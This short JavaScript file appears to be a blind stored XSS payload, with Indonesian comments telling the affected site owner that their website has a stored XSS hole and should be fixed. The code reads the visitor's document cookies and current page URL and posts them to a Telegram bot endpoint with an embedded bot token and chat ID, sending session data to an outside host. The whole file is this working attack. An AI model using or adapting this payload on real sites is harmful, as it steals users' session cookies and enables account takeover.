// halooooo, kalau anda di arahkan ke link berikut, berarti ada celah kemanan blind xss stored dalam web anda
// mwehehehehehe
// perbaiki yak webnya,
// stay secure

let cookies = document.cookie; 
let currentURL = window.location.href;

fetch("https://api.telegram.org/bot6592357228:AAEFYVLiyqAwhxMrgP37B2h9MAO8U2OOLTQ/sendMessage", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        chat_id: "-4811466610",
        text: `Cookies: ${cookies}\nURL: ${currentURL}`
    })
});


